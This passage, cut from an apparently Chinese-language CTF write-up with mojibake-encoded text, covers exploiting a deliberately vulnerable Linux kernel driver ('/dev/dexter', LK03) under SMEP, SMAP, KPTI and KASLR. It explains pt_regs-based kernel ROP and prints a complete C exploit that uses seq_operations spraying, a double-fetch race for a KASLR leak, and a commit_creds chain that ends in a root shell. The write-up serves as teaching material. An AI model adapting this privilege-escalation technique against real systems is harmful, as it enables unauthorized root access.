i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>p<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/proc/self/stat"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>è¿™æ˜¯å› ä¸ºåœ¨æ™®é€šç”¨æˆ·æƒé™ä¸‹æˆ‘ä»¬æ²¡æœ‰å¯¹è¯¥è®¾å¤‡çš„å†™æƒé™</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>p<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/proc/self/stat"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="äºŒã€LK03-smep-smap-kpti-kaslr"><a href="#äºŒã€LK03-smep-smap-kpti-kaslr" class="headerlink" title="äºŒã€LK03 +smep, +smap,  kpti,  kaslr"></a>äºŒã€LK03 +smep, +smap,  kpti,  kaslr</h1><h2 id="ä¸€-åˆ©ç”¨æ€è·¯"><a href="#ä¸€-åˆ©ç”¨æ€è·¯" class="headerlink" title="(ä¸€) åˆ©ç”¨æ€è·¯"></a>(ä¸€) åˆ©ç”¨æ€è·¯</h2><h3 id="pt-regsæ„é€ é€šç”¨kROP"><a href="#pt-regsæ„é€ é€šç”¨kROP" class="headerlink" title="pt_regsæ„é€ é€šç”¨kROP"></a>pt_regsæ„é€ é€šç”¨kROP</h3><p>å†…æ ¸ä¸­ç³»ç»Ÿè°ƒç”¨çš„å¤„ç†å…¥å£æ˜¯<a href="https://elixir.bootlin.com/linux/v5.17.1/source/arch/x86/entry/entry_64.S"><code>entry_SYSCALL_64</code></a>ï¼Œå…¶ä¸­åŒ…å«è¿™æ ·ä¸€æ¡æŒ‡ä»¤ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">PUSH_AND_CLEAR_REGS rax<span class="token operator">=</span>$<span class="token operator">-</span>ENOSYS<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ ¹æ®Linuxæºç ï¼Œ<a href="https://elixir.bootlin.com/linux/v5.17.1/source/arch/x86/entry/calling.h#L117">PUSH_AND_CLEAR_REGS</a>æ˜¯ä¸€ä¸ªæ±‡ç¼–å®ï¼ŒåŒ…å«<code>PUSH_REGS</code>å’Œ<code>CLEAR_REGS</code>ä¸¤ä¸ªå®ï¼Œå…¶ä¸­<code>PUSH_REGS</code>ä¼šå°†å¯„å­˜å™¨å‹æ ˆï¼š</p><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">.macro PUSH_REGS rdx&#x3D;%rdx rax&#x3D;%rax save_ret&#x3D;0.if \save_retpushq%rsi&#x2F;* pt_regs-&gt;si *&#x2F;movq8(%rsp), %rsi&#x2F;* temporarily store the return address in %rsi *&#x2F;movq%rdi, 8(%rsp)&#x2F;* pt_regs-&gt;di (overwriting original return address) *&#x2F;.elsepushq   %rdi&#x2F;* pt_regs-&gt;di *&#x2F;pushq   %rsi&#x2F;* pt_regs-&gt;si *&#x2F;.endifpushq\rdx&#x2F;* pt_regs-&gt;dx *&#x2F;pushq   %rcx&#x2F;* pt_regs-&gt;cx *&#x2F;pushq   \rax&#x2F;* pt_regs-&gt;ax *&#x2F;pushq   %r8&#x2F;* pt_regs-&gt;r8 *&#x2F;pushq   %r9&#x2F;* pt_regs-&gt;r9 *&#x2F;pushq   %r10&#x2F;* pt_regs-&gt;r10 *&#x2F;pushq   %r11&#x2F;* pt_regs-&gt;r11 *&#x2F;pushq%rbx&#x2F;* pt_regs-&gt;rbx *&#x2F;pushq%rbp&#x2F;* pt_regs-&gt;rbp *&#x2F;pushq%r12&#x2F;* pt_regs-&gt;r12 *&#x2F;pushq%r13&#x2F;* pt_regs-&gt;r13 *&#x2F;pushq%r14&#x2F;* pt_regs-&gt;r14 *&#x2F;pushq%r15&#x2F;* pt_regs-&gt;r15 *&#x2F;UNWIND_HINT_REGS.if \save_retpushq%rsi&#x2F;* return address on top of stack *&#x2F;.endif.endm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨æ ˆä¸­å½¢æˆä¸€ä¸ª<a href="https://elixir.bootlin.com/linux/v5.17.1/source/arch/x86/include/asm/ptrace.h#L59"><code>pt_regs</code>ç»“æ„ä½“</a>ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"> <span class="token operator">*</span> unless syscall needs a complete<span class="token punctuation">,</span> fully filled <span class="token string">"struct pt_regs"</span><span class="token punctuation">.</span> <span class="token operator">*</span><span class="token operator">/</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> r15<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> r14<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> r13<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> r12<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> bp<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> bx<span class="token punctuation">;</span><span class="token comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> r11<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> r10<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> r9<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> r8<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> ax<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> cx<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> dx<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> si<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> di<span class="token punctuation">;</span><span class="token comment">/* * On syscall entry, this is syscall#. On CPU exception, this is error code. * On hw interrupt, it's IRQ number: */</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> orig_ax<span class="token punctuation">;</span><span class="token comment">/* Return frame for iretq */</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> ip<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> cs<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> flags<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> sp<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> ss<span class="token punctuation">;</span><span class="token comment">/* top of stack page */</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="äºŒ-EXP"><a href="#äºŒ-EXP" class="headerlink" title="(äºŒ)EXP"></a>(äºŒ)EXP</h2><p>é€šè¿‡gdbè°ƒè¯•ï¼Œåœ¨åŠ«æŒæ‰§è¡Œæµæ—¶ç¦»å¸ƒç½®çš„pt_regsæœ‰0x170å­—èŠ‚ï¼Œä½œè€…æ‰¾åˆ°äº†è¿™æ ·ä¸€ä¸ªgadgetï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token number">0xffffffff810bf813</span><span class="token operator">:</span> add rsp<span class="token punctuation">,</span> <span class="token number">0x140</span><span class="token punctuation">;</span> mov eax<span class="token punctuation">,</span>r9d<span class="token punctuation">;</span> pop rbx<span class="token punctuation">;</span> pop r12<span class="token punctuation">;</span> pop r13<span class="token punctuation">;</span> pop r14<span class="token punctuation">;</span> pop r15<span class="token punctuation">;</span> pop rbp<span class="token punctuation">;</span> ret<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>0x140+6æ¬¡popæ­£å¥½æ˜¯0x170</p><p>ç„¶ååœ¨pt_regsä¸Šå¸ƒç½®ropchainï¼š</p><ul><li>è·Ÿä»¥å¾€ä¸åŒçš„æ˜¯æˆ‘ä»¬æ²¡æœ‰åœ¨æ ˆä¸Šæ”¾å­˜å‚¨çš„ç”¨æˆ·æ€å¯„å­˜å™¨å€¼ï¼Œå› ä¸º<code>pt_regs</code>ç»“æ„ä½“çš„æœ«å°¾æ°å¥½æä¾›äº†ç”¨æˆ·æ€å¯„å­˜å™¨ä¸Šä¸‹æ–‡ä¿¡æ¯ï¼Œå› æ­¤ä¸å¿…åƒä»¥å¾€çš„ROPä¸€æ ·æŠŠå®ƒä»¬æ”¾åœ¨æ ˆä¸Šï¼ˆè¿™é‡Œçš„ç©ºé—´ä¹Ÿä¸å¤Ÿï¼‰ã€‚</li><li>æˆ‘ä»¬ä½¿ç”¨çš„<code>swapgs_restore_regs_and_return_to_usermode</code>ä¸è·Ÿä»¥å‰ä¸€æ ·åœ¨+22å¤„ï¼Œè€Œæ˜¯åœ¨+18å¤„ã€‚è¿™æ˜¯å› ä¸ºæˆ‘ä»¬è¿˜éœ€è¦popæ‰pt_regsä¸Šr8åˆ°ipä¹‹é—´æ— ç”¨çš„å¯„å­˜å™¨å€¼ï¼Œæ€»å…±6ä¸ªã€‚ä»+18å¼€å§‹æ­£å¥½è¿›è¡Œ4+2æ¬¡pop</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_GNU_SOURCE</span> </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sched.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;pthread.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/mman.h></span></span><span class="token class-name">size_t</span> POP_RDI_RET<span class="token operator">=</span><span class="token number">0xffffffff8109b0cd</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> MOV_RDI_RAX_REP_MOVSQ_RET<span class="token operator">=</span><span class="token number">0xffffffff8163d0ab</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> POP_RCX_RET<span class="token operator">=</span><span class="token number">0xffffffff8110d88b</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> ADD_RSP_0X140_P6_RET<span class="token operator">=</span><span class="token number">0xffffffff810bf813</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> POP_RBX_RET<span class="token operator">=</span><span class="token number">0xffffffff81290240</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> prepare_kernel_cred<span class="token operator">=</span><span class="token number">0xffffffff810729b0</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> commit_creds<span class="token operator">=</span><span class="token number">0xffffffff81072810</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> swapgs_restore_regs_and_return_to_usermode<span class="token operator">=</span><span class="token number">0xffffffff81800e10</span><span class="token punctuation">;</span><span class="token keyword">int</span> tmp_fd<span class="token punctuation">;</span><span class="token comment">/*user_cs;user_rflags;user_sp;user_ss;*/</span><span class="token class-name">size_t</span> user_cs<span class="token punctuation">,</span>user_ss<span class="token punctuation">,</span>user_rsp<span class="token punctuation">,</span>user_rflags<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token string">"mov %0,cs;"</span><span class="token string">"mov %1,ss;"</span><span class="token string">"mov %2,rsp;"</span><span class="token string">"pushf;"</span><span class="token string">"pop %3;"</span>    <span class="token operator">:</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rsp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span> <span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Success to saveStatus!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] Error : %s\033[0m\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">getRootShell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31;37m[*] &lt;Successfully Get Root Privileges>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] &lt;Get Root Error>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">&#123;</span><span class="token keyword">char</span> <span class="token operator">*</span>ptr<span class="token punctuation">;</span><span class="token class-name">size_t</span> len<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">request_t</span><span class="token punctuation">;</span><span class="token keyword">int</span> win<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> fd<span class="token punctuation">;</span><span class="token class-name">request_t</span> req<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">dexter_read</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>req<span class="token punctuation">.</span>ptr<span class="token operator">=</span>buf<span class="token punctuation">;</span>req<span class="token punctuation">.</span>len<span class="token operator">=</span>size<span class="token punctuation">;</span><span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token number">0xdec50001</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">dexter_write</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>req<span class="token punctuation">.</span>ptr<span class="token operator">=</span>buf<span class="token punctuation">;</span>req<span class="token punctuation">.</span>len<span class="token operator">=</span>size<span class="token punctuation">;</span><span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token number">0xdec50002</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">race</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>win<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>req<span class="token punctuation">.</span>len<span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span>size<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">compete_read</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token class-name">pthread_t</span> compete_id<span class="token punctuation">;</span><span class="token function">pthread_create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>compete_id<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> race<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>win<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">dexter_read</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> leak<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>buf<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>leak<span class="token operator">&amp;</span><span class="token number">0xff00000000000000</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xff00000000000000</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] compete_read Finished\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>win<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">pthread_join</span><span class="token punctuation">(</span>compete_id<span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>win<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">compete_write</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token class-name">pthread_t</span> compete_id<span class="token punctuation">;</span><span class="token function">pthread_create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>compete_id<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> race<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">0x10000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">dexter_write</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">pthread_cancel</span><span class="token punctuation">(</span>compete_id<span class="token punctuation">)</span><span class="token punctuation">;</span>win<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//spray</span><span class="token keyword">int</span> p<span class="token punctuation">[</span><span class="token number">200</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>p<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/proc/self/stat"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Spary 100 seq_operations"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fd<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/dexter"</span><span class="token punctuation">,</span>O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fd<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] /dev/dexter Opened"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">200</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>p<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/proc/self/stat"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Spary 100 seq_operations"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//leak</span><span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token function">compete_read</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> seq_start<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token number">0x20</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> koff<span class="token operator">=</span>seq_start<span class="token operator">-</span><span class="token number">0xffffffff81000000</span><span class="token operator">-</span><span class="token number">0x170f80</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] seq_start=>0x%lx\n"</span><span class="token punctuation">,</span> seq_start<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] koff=>0x%lx\n"</span><span class="token punctuation">,</span> koff<span class="token punctuation">)</span><span class="token punctuation">;</span>POP_RDI_RET<span class="token operator">+=</span>koff<span class="token punctuation">;</span>POP_RCX_RET<span class="token operator">+=</span>koff<span class="token punctuation">;</span>POP_RBX_RET<span class="token operator">+=</span>koff<span class="token punctuation">;</span>MOV_RDI_RAX_REP_MOVSQ_RET<span class="token operator">+=</span>koff<span class="token punctuation">;</span>ADD_RSP_0X140_P6_RET<span class="token operator">+=</span>koff<span class="token punctuation">;</span>prepare_kernel_cred<span class="token operator">+=</span>koff<span class="token punctuation">;</span>commit_creds<span class="token operator">+=</span>koff<span class="token punctuation">;</span>swapgs_restore_regs_and_return_to_usermode<span class="token operator">+=</span>koff<span class="token operator">+</span><span class="token number">18</span><span class="token punctuation">;</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token number">0x20</span><span class="token punctuation">]</span><span class="token operator">=</span>ADD_RSP_0X140_P6_RET<span class="token punctuation">;</span><span class="token function">compete_write</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>tmp_fd<span class="token operator">=</span>p<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">__asm__</span><span class="token punctuation">(</span>        <span class="token string">"mov r15, POP_RDI_RET;"</span>        <span class="token string">"mov r14, 0;"</span>        <span class="token string">"mov r13, prepare_kernel_cred;"</span>        <span class="token string">"mov r12, POP_RCX_RET;"</span><span class="token string">"mov rbp, 0;"</span>        <span class="token string">"mov rbx, POP_RBX_RET;"</span><span class="token comment">//r11</span>        <span class="token string">"mov r10, MOV_RDI_RAX_REP_MOVSQ_RET;"</span>        <span class="token string">"mov r9,  commit_creds;"</span>        <span class="token string">"mov r8,  swapgs_restore_regs_and_return_to_usermode;"</span>        <span class="token string">"xor rax, rax;"</span>        <span class="token string">"mov rdx, 0x8;"</span>        <span class="token string">"mov rsi, rsp;"</span>        <span class="token string">"mov rdi, tmp_fd;"</span>        <span class="token string">"syscall;"</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">getRootShell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><s